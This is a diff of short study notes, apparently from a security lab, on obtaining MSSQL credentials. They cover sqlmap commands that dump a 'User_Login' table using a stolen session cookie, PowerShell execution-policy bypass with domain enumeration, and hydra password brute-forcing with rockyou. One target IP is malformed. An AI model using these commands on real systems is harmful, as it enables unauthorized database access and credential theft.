@@ -1,11 +1,15 @@
 Get credentials to MSSQL - possibility 1
 
 Step 1 – Log in to the website (SQLi with ZAP or create account)
+
 Step 2 – Get session cookie (logged in user)
+
 Step 3 - Test + enumerate databases +dump
+
 sqlmap -u "URL" --cookie="cookie" --dbs
 sqlmap -u "URL" --cookie="cookie" -D moviescope --tables
 sqlmap -u "URL" --cookie="cookie" -D moviescope -T  User_Login --dump
+
 _____________________________________________________________________________________________
 Get credentials to MSSQL - possibility 2
 powershell -EP Bypass
@@ -13,7 +17,6 @@ powershell -EP Bypass
 Get-NetComputer
 Get-NetGroup 
 Get-NetUser
-
 hydra -L <USER_LIST> -P <PASSWORD_LIST> <TARGET_IP> mssql 
 hydra -l SQL_srv -P /root/ADtools/rockyou.txt 10.10.2.1.30 mssql
 _____________________________________________________________________________________________
